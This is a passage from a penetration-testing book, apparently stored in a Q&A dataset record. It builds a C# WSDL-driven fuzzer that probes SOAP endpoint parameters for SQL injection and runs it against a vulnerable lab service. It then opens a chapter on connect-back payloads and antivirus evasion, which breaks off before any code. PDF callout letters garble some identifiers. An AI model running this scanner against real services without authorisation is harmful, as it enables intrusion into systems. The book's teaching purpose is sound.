string Location { get; set; }\npublic string SoapAction { get; set; }\n}\nListing 3-18: The SoapBindingOperation class\nUsing the XmlNode that’s passed to the constructor, we first assign the\nName property u to the value of the name attribute on the XML node. The\noperation node contains a few child nodes, but we only really care about\nthree specific nodes: http:operation, soap:operation, and soap12:operation.\nAs we iterate over the child nodes to find a node we care about, we check\nwhether the operation is an HTTP operation or a SOAP operation. If it is\nan HTTP operation v, we store the location of the endpoint for the opera-\ntion, which is a relative URI such as /AddUser. If it’s a SOAP operation, we\nstore the SoapAction, which is used in a specific HTTP header when making\nSOAP calls against the SOAP endpoint. When we write the fuzzing logic,\nthis information will be used to send the data to the correct endpoint.\nFinding the SOAP Services on Ports\nBefore we can begin fuzzing, we need to finish parsing the WSDL. We’ll\nimplement two more small classes that encompass the SOAP services\navailable and the SOAP ports on those services. We must implement the\nSoapService class first, as shown in Listing 3-19.\npublic class SoapService\n{\npublic SoapService(XmlNode node)\n{\nthis.Name = unode.Attributes[\"name\"].Value;\nthis.Ports = new List<SoapPort>();\nforeach (XmlNode port in node.ChildNodes)\nthis.Ports.Add(new SoapPort(port));\n}\npublic string Name { get; set; }\npublic List<SoapPort> Ports { get; set; }\n}\nListing 3-19: The SoapService class\nThe SoapService class takes an XML node as the only argument to the\nconstructor. We first assign the name of the service to the Name property\nof the class u and then create a new list of ports, called SoapPort. As we\niterate over the child nodes in the service node, we use each child node to\ncreate a new SoapPort and add the new object to the SoapPort list for later\nreference.\n66 Chapter 3\nA sample service XML node with four child port nodes from a WSDL\ndocument is shown in Listing 3-20.\n<service name=\"VulnerableService\">\n<port name=\"VulnerableServiceSoap\" binding=\"s0:VulnerableServiceSoap\">\n<soap:address location=\"http://127.0.0.1:8080/Vulnerable.asmx\"/>\n</port>\n<port name=\"VulnerableServiceSoap12\" binding=\"s0:VulnerableServiceSoap12\">\n<soap12:address location=\"http://127.0.0.1:8080/Vulnerable.asmx\"/>\n</port>\n<port name=\"VulnerableServiceHttpGet\" binding=\"s0:VulnerableServiceHttpGet\">\n<http:address location=\"http://127.0.0.1:8080/Vulnerable.asmx\"/>\n</port>\n<port name=\"VulnerableServiceHttpPost\" binding=\"s0:VulnerableServiceHttpPost\">\n<http:address location=\"http://127.0.0.1:8080/Vulnerable.asmx\"/>\n</port>\n</service>\nListing 3-20: A sample service node from a WSDL document\nThe last thing to do is implement the SoapPort class to complete the\nParseServices() method and then finish parsing the WSDL for fuzzing. The\nSoapPort class is shown in Listing 3-21.\npublic class SoapPort\n{\npublic SoapPort(XmlNode port)\n{\nthis.Name = uport.Attributes[\"name\"].Value;\nthis.Binding = port.Attributes[\"binding\"].Value;\nthis.ElementType = port.vFirstChild.Name;\nthis.Location = port.FirstChild.Attributes[\"location\"].Value;\n}\npublic string Name { get; set; }\npublic string Binding { get; set; }\npublic string ElementType { get; set; }\npublic string Location { get; set; }\n}\nListing 3-21: The SoapPort class\nTo finish parsing the WSDL document, we grab a few attributes from\nthe port node passed to the SoapPort constructor. We first store the name\nof the port in the Name property u and the binding in the Binding property.\nThen, referencing the port node’s only child node with the FirstChild\nproperty v, we store the name and location data of the child node in the\nElementType and Location properties, respectively.\nFinally, we have broken apart the WSDL document into manageable\npieces that will allow us to easily write a fuzzer to find potential SQL injec-\ntions. With the various parts of the WSDL described as classes, we can pro-\ngrammatically drive automatic vulnerability detection and reporting.\nFuzzing SOAP Endpoints 67\nautomatically Fuzzing the SOaP endpoint for\nSQL injection Vulnerabilities\nNow that the building blocks for the WSDL fuzzer have been built, we can\nstart doing some real fun tool development. Using the WSDL class, we can\ninteract with the data in the WSDL in an object-oriented manner, which\nmakes fuzzing the SOAP endpoint much easier. We start by writing a new\nMain() method that accepts a single argument (the URL to the SOAP end-\npoint), which can be created in its own file inside of its own Fuzzer class, as\nshown in Listing 3-22.\nprivate static uWSDL _wsdl = null;\nprivate static vstring _endpoint = null;\npublic static void Main(string[] args)\n{\n_endpoint = wargs[0];\nConsole.WriteLine(\"Fetching the WSDL for service: \" + _endpoint);\nHttpWebRequest req = (HttpWebRequest)WebRequest.Create(_endpoint + \"?WSDL\");\nXmlDocument wsdlDoc = new XmlDocument();\nusing (WebResponse resp = req.GetResponse())\nusing (Stream respStream = resp.GetResponseStream())\nwsdlDoc.xLoad(respStream);\n_wsdl = new WSDL(wsdlDoc);\nConsole.WriteLine(\"Fetched and loaded the web service description.\");\nforeach (SoapService service in _wsdl.Services)\nFuzzService(service);\n}\nListing 3-22: The Main() method of the SOAP endpoint fuzzer\nWe first declare a couple of static variables at the class level before the\nMain() method. These variables will be used throughout methods we write.\nThe first variable is the WSDL class u, and the second stores the URL to the\nSOAP endpoint v.\nWithin the Main() method, we assign the _endpoint variable to the value of\nthe first argument passed to the fuzzer w. Then we print a friendly message\nalerting the user that we are going to fetch the WSDL for the SOAP service.\nAfter storing the URL to the endpoint, we create a new HttpWebRequest\nto retrieve the WSDL from the SOAP service by appending ?WSDL to the\nend of the endpoint URL. We also create a temporary XmlDocument to store\nthe WSDL and to pass to the WSDL class constructor. Passing the HTTP\nresponse stream to the XmlDocument Load() method x, we load the XML\nreturned by the HTTP request into the XML document. We then pass the\nresulting XML document to the WSDL class constructor to create a new\nWSDL object. Now we can iterate over each of the SOAP endpoint services\nand fuzz the service. A foreach loop iterates over the objects in the WSDL\nclass Services property and passes each service to the FuzzService() method,\nwhich we’ll write in the next section.\n68 Chapter 3\nFuzzing Individual SOAP Services\nThe FuzzService() method takes a SoapService as an argument and then\ndetermines whether we need to fuzz the service using SOAP or HTTP\nparameters, as shown in Listing 3-23.\nstatic void FuzzService(SoapService service)\n{\nConsole.WriteLine(\"Fuzzing service: \" + service.Name);\nforeach (SoapPort port in service.Ports)\n{\nConsole.WriteLine(\"Fuzzing \" + port.ElementType.Split(':')[0] + \" port: \" + port.Name);\nSoapBinding binding = _wsdl.Bindings.uSingle(b => b.Name == port.Binding.Split(':')[1]);\nif (binding.vIsHTTP)\nFuzzHttpPort(binding);\nelse\nFuzzSoapPort(binding);\n}\n}\nListing 3-23: The FuzzService() method used to determine how to fuzz a given SoapService\nAfter printing the current service we’ll be fuzzing, we iterate over each\nSOAP port in the Ports service property. Using the Language-Integrated\nQuery (LINQ) Single() method u, we select a single SoapBinding that cor-\nresponds to the current port. Then we test whether the binding is plain\nHTTP or XML-based SOAP. If the binding is an HTTP binding v, we pass\nit to the FuzzHttpPort() method to fuzz. Otherwise, we assume the binding is\na SOAP binding and pass it to the FuzzSoapPort() method.\nNow let’s implement the FuzzHttpPort() method. The two types of pos-\nsible HTTP ports when you’re dealing with SOAP are GET and POST. The\nFuzzHttpPort() method determines which HTTP verb will be used when\nsending the HTTP requests during fuzzing, as shown in Listing 3-24.\nstatic void FuzzHttpPort(SoapBinding binding)\n{\nif (binding.Verb == \"GET\")\nFuzzHttpGetPort(binding);\nelse if (binding.Verb == \"POST\")\nFuzzHttpPostPort(binding);\nelse\nthrow new Exception(\"Don't know verb: \" + binding.Verb);\n}\nListing 3-24: The FuzzHttpPort() method\nThe FuzzHttpPort() method is very simple. It tests whether the SoapBinding\nproperty Verb equals GET or POST and then passes the binding to the appropri-\nate method—FuzzHttpGetPort() or FuzzHttpPostPort(), respectively. If the Verb\nproperty does not equal either GET or POST, an exception is thrown to alert the\nuser that we don’t know how to handle the given HTTP verb.\nFuzzing SOAP Endpoints 69\nNow that we’ve created the FuzzHttpPort() method, we’ll implement the\nFuzzHttpGetPort() method.\nCreating the URL to Fuzz\nBoth of the HTTP fuzzing methods are a bit more complex than the previ-\nous methods in the fuzzer. The first half of the FuzzHttpGetPort() method,\ncovered in Listing 3-25, builds the initial URL to fuzz.\nstatic void FuzzHttpGetPort(SoapBinding binding)\n{\nSoapPortType portType = _wsdl.PortTypes.uSingle(pt => pt.Name == binding.Type.Split(':')[1]);\nforeach (SoapBindingOperation op in binding.Operations)\n{\nConsole.WriteLine(\"Fuzzing operation: \" + op.Name);\nstring url = v_endpoint + op.Location;\nSoapOperation po = portType.Operations.Single(p => p.Name == op.Name);\nSoapMessage input = _wsdl.Messages.Single(m => m.Name == po.Input.Split(':')[1]);\nDictionary<string, string> parameters = new Dictionary<string, string>();\nforeach (SoapMessagePart part in input.Parts)\nparameters.Add(part.Name, part.Type);\nbool wfirst = true;\nList<Guid> guidList = new List<Guid>();\nforeach (var param in parameters)\n{\nif (param.Value.EndsWith(\"string\"))\n{\nGuid guid = Guid.NewGuid();\nguidList.Add(guid);\nurl x+= (first ?y \"?\" : \"&\") + param.Key + \"=\" + guid.ToString();\n}\nfirst = false;\n}\nListing 3-25: The first half of the FuzzHttpGetPort() method, where we build the initial URL to fuzz\nThe first thing we do in the FuzzHttpGetPort() method is use LINQ u\nto select the port type from our WSDL class that corresponds to the current\nSOAP binding. We then iterate over the current binding’s Operations prop-\nerty, which contains information regarding each operation we can call and\nhow to call the given operation. As we iterate, we print which operation\nwe are going to fuzz. We then create the URL that we’ll use to make the\nHTTP request for the given operation by appending the Location property\nof the current operation to the _endpoint variable we set at the very begin-\nning of the Main() method v. We select the current SoapOperation (not to\nbe confused with the SoapBindingOperation!) from the Operations property of\nthe portType using the LINQ method Single(). We also select the SoapMessage\nused as the input for the current operation using the same LINQ method,\nwhich tells us what information the current operation is expecting when\ncalled.\n70 Chapter 3\nOnce we have the information we need to set up the GET URL, we\ncreate a dictionary to hold the HTTP parameter names and the param-\neter types we’ll be sending. We iterate over each of the input parts using\na foreach loop. As we iterate, we add the name of each parameter and the\ntype, which in this case will always be a string, to the dictionary. After we\nhave all of our parameter names and their respective types stored alongside\neach other, we can build the initial URL to fuzz.\nTo begin, we define a Boolean called first w, which we’ll use to deter-\nmine whether the parameter that’s appended to the operation’s URL is the\nfirst parameter. This is important because the first query string parameter\nis always separated from the base URL by a question mark (?), and subse-\nquent parameters are separated with an ampersand (&), so we need to be\nsure of the distinction. Then, we create a Guid list, which will hold unique\nvalues that we send along with the parameters so we can reference them in\nthe second half of the FuzzHttpGetPort() method.\nNext, we iterate over the parameters dictionary using a foreach loop.\nIn this foreach loop, first we test whether the current parameter’s type is a\nstring. If it’s a string, we create a new Guid that will be used as the param-\neter’s value; then we add the new Guid to the list we created so we can ref-\nerence it later. We then use the += operator x to append the parameter\nand the new value to the current URL. Using a ternary operation y, we\ndetermine whether we should prefix the parameter with a question mark or\nampersand. This is how the HTTP query string parameters must be defined\nper the HTTP protocol. If the current parameter is the first parameter, it is\nprepended with a question mark. Otherwise, it is prepended with an amper-\nsand. Finally, we set the parameter to false so that subsequent parameters\nwill be prepended with the correct separating character.\nFuzzing the Created URL\nAfter creating the URL with query string parameters, we can make HTTP\nrequests while systematically replacing parameter values with tainted values\nthat could induce a SQL error from the server, as shown in Listing 3-26.\nThis second half of the code completes the FuzzHttpGetPort() method.\nConsole.WriteLine(\"Fuzzing full url: \" + url);\nint k = 0;\nforeach(Guid guid in guidList)\n{\nstring testUrl = url.uReplace(guid.ToString(), \"fd'sa\");\nHttpWebRequest req = (HttpWebRequest)WebRequest.Create(testUrl);\nstring resp = string.Empty;\ntry\n{\nusing (StreamReader rdr = new vStreamReader(req.GetResponse().GetResponseStream()))\nresp = rdr.ReadToEnd();\n}\nwcatch (WebException ex)\n{\nusing (StreamReader rdr = new StreamReader(ex.Response.GetResponseStream()))\nFuzzing SOAP Endpoints 71\nresp = rdr.ReadToEnd();\nif (resp.Contains(\"syntax error\"))\nConsole.WriteLine(\"Possible SQL injection vector in parameter: \" + input.xParts[k].Name);\n}\nk++;\n}\n}\n}\nListing 3-26: The second half of the FuzzHttpGetPort() method, sending the HTTP requests\nNow that we have the full URL that we’ll be fuzzing, we print it for the\nuser to see. We also declare an integer, k, that will be incremented as we\niterate over the parameter values in the URL to keep track of potentially\nvulnerable parameters. Then, using a foreach loop, we iterate over the Guid\nlist we used as the values for our parameters. Within the foreach loop, the\nfirst thing we do is replace the current Guid in the URL with the string\n\"fd'sa\" using the Replace() method u, which should taint any SQL queries\nusing the value without proper sanitization. We then create a new HTTP\nrequest with the modified URL and declare an empty string called resp that\nwill hold the HTTP response.\nWithin a try/catch block, we attempt to read the response of the HTTP\nrequest from the server using a StreamReader v. Reading the response will\ncause an exception if the server returns a 500 error (which would happen if\na SQL exception occurred on the server side). If an exception is thrown, we\ncatch the exception in the catch block w and attempt to read the response\nfrom the server again. If the response contains the string syntax error, we\nprint a message alerting the user that the current HTTP parameter could\nbe vulnerable to a SQL injection. In order to tell the user precisely which\nparameter could be vulnerable, we use the integer k as the index of the\nParts list x and retrieve the Name of the current property. When all is said\nand done, we increment the integer k by 1 and start back at the beginning\nof the foreach loop with a new value to test.\nThat’s the full method for fuzzing HTTP GET SOAP ports. Next, we\nneed to implement FuzzHttpPostPort() to fuzz POST SOAP ports.\nFuzzing the HTTP POST SOAP Port\nFuzzing the HTTP POST SOAP port for a given SOAP service is very simi-\nlar to fuzzing the GET SOAP port. The only difference is that the data is\nsent as HTTP POST parameters instead of query-string parameters. When\npassing the SoapBinding for the HTTP POST port to the FuzzHttpPostPort()\nmethod, we need to iterate over each operation and systematically taint\nvalues sent to the operations to induce SQL errors from the web server.\nListing 3-27 shows the first half of the FuzzHttpPostPort() method.\nstatic void FuzzHttpPostPort(SoapBinding binding)\n{\nuSoapPortType portType = _wsdl.PortTypes.Single(pt => pt.Name == binding.Type.Split(':')[1]);\nforeach (SoapBindingOperation op in binding.Operations)\n72 Chapter 3\n{\nConsole.WriteLine(\"Fuzzing operation: \" + op.Name);\nstring url = _endpoint + op.Location;\nvSoapOperation po = portType.Operations.Single(p => p.Name == op.Name);\nSoapMessage input = _wsdl.Messages.Single(m => m.Name == po.Input.Split(':')[1]);\nDictionary<string, string> parameters = new wDictionary<string, string>();\nforeach (SoapMessagePart part in input.Parts)\nparameters.Add(part.Name, part.Type);\nListing 3-27: Determining the operation and parameters to fuzz within the FuzzHttpPostPort() method\nFirst we select the SoapPortType u that corresponds to the SoapBinding\npassed to the method. We then iterate over each SoapBindingOperation to\ndetermine the current SoapBinding using a foreach loop. As we iterate, we\nprint a message that specifies which operation we are currently fuzzing, and\nthen we build the URL to send the data we are fuzzing to. We also select the\ncorresponding SoapOperation v for the portType variable so that we can find\nthe SoapMessage we need, which contains the HTTP parameters we need to\nsend to the web server. Once we have all the information we need to build\nand make valid requests to the SOAP service, we build a small dictionary w\ncontaining the parameter names and their types to iterate over later.\nNow we can build the HTTP parameters we’ll send to the SOAP\nservice, as shown in Listing 3-28. Continue entering this code into the\nFuzzHttpPostPort() method.\nstring postParams = string.Empty;\nbool first = true;\nList<Guid> guids = new List<Guid>();\nforeach (var param in parameters)\n{\nif (param.Value.uEndsWith(\"string\"))\n{\nGuid guid = Guid.NewGuid();\npostParams += (first v? \"\" : \"&\") + param.Key + \"=\" + guid.ToString();\nguids.Add(guid);\n}\nif (first)\nfirst = wfalse;\n}\nListing 3-28: Building the POST parameters to be sent to the POST HTTP SOAP port\nWe now have all the data we need to build the POST requests. We\ndeclare a string to hold the POST parameters, and we declare a Boolean,\nwhich will determine whether the parameter will be prefixed with an amper-\nsand, to delineate the POST parameters. We also declare a Guid list so that\nwe can store the values we add to the HTTP parameters for use later in the\nmethod.\nNow we can iterate over each of the HTTP parameters using a foreach\nloop and build the parameters string that we’ll send in the POST request\nbody. As we iterate, first we check whether the parameter type ends with\nFuzzing SOAP Endpoints 73\nstring u. If it does, we create a string for a parameter value. To track which\nstring values we use and to ensure each value is unique, we create a new\nGuid and use this as the parameter’s value. Using a ternary operation v, we\ndetermine whether we should prefix the parameter with an ampersand. We\nthen store the Guid in the Guid list. Once we have appended the parameter\nand value to the POST parameters string, we check the Boolean value and,\nif it is true, set it to false w so that later POST parameters will be delineated\nwith an ampersand.\nNext, we need to send the POST parameters to the server and then\nread the response and check for any errors, as Listing 3-29 shows.\nint k = 0;\nforeach (Guid guid in guids)\n{\nstring testParams = postParams.uReplace(guid.ToString(), \"fd'sa\");\nbyte[] data = System.Text.Encoding.ASCII.GetBytes(testParams);\nHttpWebRequest req = v(HttpWebRequest) WebRequest.Create(url);\nreq.Method = \"POST\";\nreq.ContentType = \"application/x-www-form-urlencoded\";\nreq.ContentLength = data.Length;\nreq.GetRequestStream().wWrite(data, 0, data.Length);\nstring resp = string.Empty;\ntry\n{\nusing (StreamReader rdr = new StreamReader(req.GetResponse().GetResponseStream()))\nresp = rdr.xReadToEnd();\n} catch (WebException ex)\n{\nusing (StreamReader rdr = new StreamReader(ex.Response.GetResponseStream()))\nresp = rdr.ReadToEnd();\nif (resp.yContains(\"syntax error\"))\nConsole.WriteLine(\"Possible SQL injection vector in parameter: \" + input.Parts[k].Name);\n}\nk++;\n}\n}\nListing 3-29: Sending the POST parameters to the SOAP service and checking for server errors\nTo start off, we declare an integer named k, which will be incremented\nand used throughout the fuzzing to keep track of potentially vulnerable\nparameters, and we assign k a value of 0. Then we iterate over the Guid list\nusing a foreach loop. As we iterate, the first thing we do is create a new\nPOST parameter string by replacing the current Guid with a tainted value\nusing the Replace() method u. Because each Guid is unique, when we replace\nthe Guid, it will only change a single parameter’s value. This lets us determine\nexactly which parameter has a potential vulnerability. Next, we send the\nPOST request and read the response.\n74 Chapter 3\nOnce we have the new POST parameter string to send to the SOAP ser-\nvice, we convert the string to an array of bytes using the GetBytes() method\nthat will be written to the HTTP stream. We then build the HttpWebRequest v\nto send the bytes to the server and set the HttpWebRequest’s Method property to\n\"POST\", the ContentType property to application/x-www-form-urlencoded, and\nthe ContentLength property to the size of the byte array. Once this is built,\nwe write the byte array to the request stream by passing the byte array, the\nindex of the array to begin writing from (0), and the number of bytes to\nwrite to the Write() method w.\nAfter the POST parameters have been written to the request stream, we\nneed to read the response from the server. After declaring an empty string\nto hold the HTTP response, we use a try/catch block to catch any excep-\ntions thrown while reading from the HTTP response stream. Creating a\nStreamReader in the context of a using statement, we attempt to read the\nentire response with the ReadToEnd() method x and assign the response to\nan empty string. If the server responds with an HTTP code of 50x (which\nmeans an error occurred on the server side), we catch the exception, attempt\nto read the response again, and reassign the response string to the empty\nstring to update it. If the response contains the phrase syntax error y, we\nprint a message alerting the user that the current HTTP parameter could\nbe vulnerable to a SQL injection. To determine which parameter was vul-\nnerable, we use the integer k as the index of the parameter list to get the\ncurrent parameter’s Name. Finally, we increment the k integer by 1 so that the\nnext parameter will be referenced in the next iteration, and then we start\nthe process over again for the next POST parameter.\nThat completes the FuzzHttpGetPort() and FuzzHttpPostPort() methods.\nNext, we’ll write the FuzzSoapPort() method to fuzz the SOAP XML port.\nFuzzing the SOAP XML Port\nIn order to fuzz the SOAP XML port, we need to dynamically build XML\nto send to the server, which is slightly more difficult than building HTTP\nparameters to send in a GET or POST request. Starting off, though, the\nFuzzSoapPort() method is similar to FuzzHttpGetPort() and FuzzHttpPostPort(),\nas shown in Listing 3-30.\nstatic void FuzzSoapPort(SoapBinding binding)\n{\nSoapPortType portType = _wsdl.PortTypes.Single(pt => pt.Name == binding.Type.Split(':')[1]);\nforeach (SoapBindingOperation op in binding.Operations)\n{\nConsole.uWriteLine(\"Fuzzing operation: \" + op.Name);\nSoapOperation po = portType.Operations.Single(p => p.Name == op.Name);\nSoapMessage input = _wsdl.Messages.Single(m => m.Name == po.Input.Split(':')[1]);\nListing 3-30: Gathering initial information to build dynamic SOAP XML\nAs with the GET and POST fuzzing methods, we need to collect some\ninformation about what we are going to fuzz before we can do anything.\nFuzzing SOAP Endpoints 75\nWe first grab the corresponding SoapPortType from the _wsdl.PortTypes prop-\nerty using LINQ; then we iterate over each operation with a foreach loop.\nAs we iterate, we print the current operation we are fuzzing to the con-\nsole u. In order to send the correct XML to the server, we need to select\nthe SoapOperation and SoapMessage classes that correspond to the SoapBinding\nclass passed to the method. Using the SoapOperation and SoapMessage, we can\ndynamically build the XML required. To do this, we use LINQ to XML,\nwhich is a set of built-in classes in the System.Xml.Linq namespace that lets\nyou create s imple, dynamic XML, as shown in Listing 3-31.\nXNamespace soapNS = \"http://schemas.xmlsoap.org/soap/envelope/\";\nXNamespace xmlNS = op.uSoapAction.Replace(op.Name, string.Empty);\nXElement soapBody = new XElement(soapNS + \"Body\");\nXElement soapOperation = new vXElement(xmlNS + op.Name);\nsoapBody.Add(soapOperation);\nList<Guid> paramList = new List<Guid>();\nSoapType type = _wsdl.Types.wSingle(t => t.Name == input.Parts[0].Element.Split(':')[1]);\nforeach (SoapTypeParameter param in type.Parameters)\n{\nXElement soapParam = new xXElement(xmlNS + param.Name);\nif (param.Type.EndsWith(\"string\"))\n{\nGuid guid = Guid.NewGuid();\nparamList.Add(guid);\nsoapParam.ySetValue(guid.ToString());\n}\nsoapOperation.Add(soapParam);\n}\nListing 3-31: Building the dynamic SOAP XML using LINQ to XML in the SOAP fuzzer\nWe first create two XNameSpace instances to use when building the XML.\nThe first XNameSpace is the default SOAP namespace, but the second XNameSpace\nwill change based on the current operation’s SoapAction property u. After\nthe namespaces are defined, we create two new XML elements using the\nXElement class. The first XElement (which will be called <Body>) is a standard\nXML element used in SOAP and will encapsulate the data for the current\nSOAP operation. The second XElement will be named after the current oper-\nation v. The XElement instances use the default SOAP namespace and the\nSOAP operation namespace, respectively. We then add the second XElement\nto the first using the XElement Add() method so that the SOAP <Body> XML\nelement will contain the SOAP operation element.\nAfter creating the outer XML elements, we create a Guid list to store\nthe values we generate, and we also select the current SoapType with LINQ w\nso that we can iterate over the parameters required for the SOAP call. As\nwe iterate, we first create a new XElement for the current parameter x. If the\nparameter type is a string, we assign the XElement a Guid for a value using\n76 Chapter 3\nSetValue() y and store the Guid in the Guid list we created for reference later.\nWe then add the XElement to the SOAP operation element and move on to\nthe next parameter.\nOnce we have completed adding the parameters to the SOAP operation\nXML node, we need to put the whole XML document together, as shown in\nListing 3-32.\nXDocument soapDoc = new XDocument(new XDeclaration(\"1.0\", \"ascii\", \"true\"),\nnew uXElement(soapNS + \"Envelope\",\nnew XAttribute(XNamespace.Xmlns + \"soap\", soapNS),\nnew XAttribute(\"xmlns\", xmlNS),\nvsoapBody));\nListing 3-32: Putting the whole SOAP XML document together\nWe need to create an XDocument with one more XElement called the SOAP\nEnvelope u. We create a new XDocument by passing a new XElement to the\nXDocument constructor. The XElement, in turn, is created with a couple of\nattributes defining the node’s XML namespaces, as well as with the SOAP\nbody we built with the parameters v.\nNow that the XML is built, we can send the XML to the web server and\nattempt to induce SQL errors, as Listing 3-33 shows. Continue to add this\ncode to the FuzzSoapPort() method.\nint k = 0;\nforeach (Guid parm in paramList)\n{\nstring testSoap = soapDoc.ToString().uReplace(parm.ToString(), \"fd'sa\");\nbyte[] data = System.Text.Encoding.ASCII.GetBytes(testSoap);\nHttpWebRequest req = (HttpWebRequest) WebRequest.Create(_endpoint);\nreq.Headers[\"SOAPAction\"] = vop.SoapAction;\nreq.Method = \"POST\";\nreq.ContentType = \"text/xml\";\nreq.ContentLength = data.Length;\nusing (Stream stream = req.GetRequestStream())\nstream.wWrite(data, 0, data.Length);\nListing 3-33: Creating the HttpWebRequest to send the SOAP XML to the SOAP endpoint\nAs with the fuzzers covered previously in the chapter, we iterate over\neach Guid in the list of values that we created while building the XML for\nthe SOAP operation. As we iterate, we replace the current Guid in the SOAP\nXML body with a value that should induce a SQL error if that value is being\nused in a SQL query unsafely u. After we replace the Guid with the tainted\nvalue, we convert the resulting string into a byte array using the GetBytes()\nmethod, which we’ll write to the HTTP stream as POST data.\nWe then build the HttpWebRequest that we’ll use to make the HTTP\nrequest and read the result. One special piece to note is the SOAPAction\nheader v. This SOAPAction HTTP header will be used by the SOAP end-\npoint to determine which action is performed with the data, such as\nFuzzing SOAP Endpoints 77",
    "question": "What is the process for creating a fuzzer to detect SQL injection vulnerabilities in SOAP endpoints using the WSDL document?",
    "summary": "This chapter explains how to detect SQL injection vulnerabilities in SOAP endpoints by first parsing the WSDL file, which describes the available methods and parameters. It details the process of creating classes to represent the WSDL structure and then writing a fuzzer that uses this information to generate HTTP requests for testing. The fuzzer systematically replaces parameter values with potentially malicious ones to identify if they trigger SQL errors, indicating a vulnerability. The chapter also covers how to handle both HTTP GET and POST requests, as well as SOAP XML-based requests, to test different types of vulnerabilities in the SOAP service."
  },
  {
    "start": 54,
    "end": 67,
    "text": "listing or deleting users. We also set the HTTP method to POST, the con-\ntent type to text/xml, and the content length to the length of the byte array\nwe created. Finally, we write the data to the HTTP stream w. Now we need\nto read the response from the server and determine whether the data we\nsent induced any SQL errors, as Listing 3-34 shows.\nstring resp = string.Empty;\ntry\n{\nusing (StreamReader rdr = new StreamReader(req.GetResponse().GetResponseStream()))\nresp = rdr.uReadToEnd();\n}\ncatch (WebException ex)\n{\nusing (StreamReader rdr = new StreamReader(ex.Response.GetResponseStream()))\nresp = rdr.ReadToEnd();\nif (resp.vContains(\"syntax error\"))\nConsole.WriteLine(\"Possible SQL injection vector in parameter: \");\nConsole.Write(type.Parameters[k].Name);\n}\nk++;\n}\n}\n}\nListing 3-34: Reading the HTTP stream in the SOAP fuzzer and looking for errors\nListing 3-34 uses almost the same code as the fuzzers in List ings 3-26\nand 3-29 to check for a SQL error, but in this case we’re h andling the\ndetected error differently. First, we declare a string to hold the HTTP\nresponse and begin a try/catch block. Then, within the context of a using\nstatement, we use a StreamReader to attempt to read the contents of the HTTP\nresponse and store the response in a string u. If an exception is thrown\nbecause the HTTP server returned a 50x error, we catch the exception and\ntry to read the response again. If an exception is thrown and the response\ndata contains the phrase syntax error v, we print a message to alert the user\nabout a possible SQL injection and the potentially vulnerable parameter\nname. Finally, we increment k and go on to the next parameter.\nRunning the Fuzzer\nWe can now run the fuzzer against the vulnerable SOAP service appliance\nCsharpVulnSoap. The fuzzer takes a single argument: the URL to the vulner-\nable SOAP endpoint. In this case, we’ll use http://192.168.1.15/Vulnerable.asmx.\nPassing the URL as the first argument and running the fuzzer should yield\nsimilar output to Listing 3-35.\n$ mono ch3_soap_fuzzer.exe http://192.168.1.15/Vulnerable.asmx\nFetching the WSDL for service: http://192.168.1.15/Vulnerable.asmx\nFetched and loaded the web service description.\n78 Chapter 3\nFuzzing service: VulnerableService\nFuzzing soap port: uVulnerableServiceSoap\nFuzzing operation: AddUser\nPossible SQL injection vector in parameter: username\nPossible SQL injection vector in parameter: password\n--snip--\nFuzzing http port: vVulnerableServiceHttpGet\nFuzzing operation: AddUser\nFuzzing full url: http://192.168.1.15/Vulnerable.asmx/AddUser?username=a7ee0684-\nfd54-41b4-b644-20b3dd8be97a&password=85303f3d-1a68-4469-bc69-478504166314\nPossible SQL injection vector in parameter: username\nPossible SQL injection vector in parameter: password\nFuzzing operation: ListUsers\nFuzzing full url: http://192.168.1.15/Vulnerable.asmx/ListUsers\n--snip--\nFuzzing http port: wVulnerableServiceHttpPost\nFuzzing operation: AddUser\nPossible SQL injection vector in parameter: username\nPossible SQL injection vector in parameter: password\nFuzzing operation: ListUsers\nFuzzing operation: GetUser\nPossible SQL injection vector in parameter: username\nFuzzing operation: DeleteUser\nPossible SQL injection vector in parameter: username\nListing 3-35: Partial output from the SOAP fuzzer running against the CsharpVulnSoap\napplication\nFrom the output, we can see the various stages of the fuzzing. Starting\nwith the VulnerableServiceSoap port u, we find that the AddUser operation\nmight be vulnerable to SQL injection in the username and password fields\npassed to the operation. Next is the VulnerableServiceHttpGet port v. We fuzz\nthe same AddUser operation and print the URL we built, which we can paste\ninto a web browser to see what the response of a successful call is. Again,\nthe username and password parameters were found to be potentially vulner-\nable to SQL injection. Finally, we fuzz the VulnerableServiceHttpPost SOAP\nport w, first fuzzing the AddUser operation, which reports the same as the\nprevious ports. The ListUsers operation reports no potential SQL injections,\nwhich makes sense because it has no parameters to begin with. Both the\nGetUser and DeleteUser operations are potentially vulnerable to SQL injec-\ntion in the username parameter.\nConclusion\nIn this chapter, you were introduced to the XML classes available from the\ncore libraries. We used the XML classes to implement a full SOAP service\nSQL injection fuzzer, and we covered a few of the methods of interacting\nwith a SOAP service.\nThe first and most simple method was via HTTP GET requests, where\nwe built URLs with dynamic query string parameters based on the how the\nWSDL document described the SOAP service. Once this was implemented,\nFuzzing SOAP Endpoints 79\nwe built a method to fuzz POST requests to the SOAP service. Finally, we\nwrote the method to fuzz the SOAP XML using the LINQ to XML libraries\nin C# to dynamically create the XML used to fuzz the server.\nThe powerful XML classes in C# make consuming and dealing with\nXML a breeze. With so many enterprise technologies reliant on XML for\ncross-platform communication, serialization, or storage, understanding\nhow to efficiently read and create XML documents on the fly can be incred-\nibly useful, especially for a security engineer or pentester.\n80 Chapter 3\n4\nwr itinG ConneCt-BaCk,\nBinDinG, anD Me taSPloit\nPayloaDS\nAs a penetration tester or a security engi-\nneer, it’s really useful to be able to write\nand customize payloads on the fly. Often,\ncorporate environments will differ drastically\nfrom one to the next, and “off-the-shelf” payloads by\nframeworks such as Metasploit are simply blocked\nby intrusion detection/prevention systems, network\naccess controls, or other variables of the network. However, Windows\nmachines on corporate networks almost always have the .NET framework\ninstalled, which makes C# a great language to write payloads in. The core\nlibraries available to C# also have excellent networking classes that allow\nyou to hit the ground running in any environment.\nThe best penetration testers know how to build custom payloads,\ntailored for particular environments, in order to stay under the radar\nlonger, maintain persistence, or bypass an intrusion detection system or\nfirewall. This chapter shows you how to write an assortment of payloads for\nuse over TCP (Transmission Control Protocol) and UDP (User Datagram\nProtocol). We’ll create a cross-platform UDP connect-back payload to\nbypass weak firewall rules and discuss how to run arbitrary Metasploit\nassembly payloads to aid in antivirus evasion.\nCreating a Connect-Back Payload\nThe first kind of payload we’ll write is a connect-back, which allows an attacker\nto listen for a connection back from the target. This type of payload is use-\nful if you don’t have direct access to the machine that the payload is being\nrun on. For example, if you are outside the network performing a phish-\ning campaign with Metasploit Pro, this type of payload allows the targets\nto reach outside the network to connect with you. The alternative, which\nwe’ll discuss shortly, is for the payload to listen for a connection from the\nattacker on the 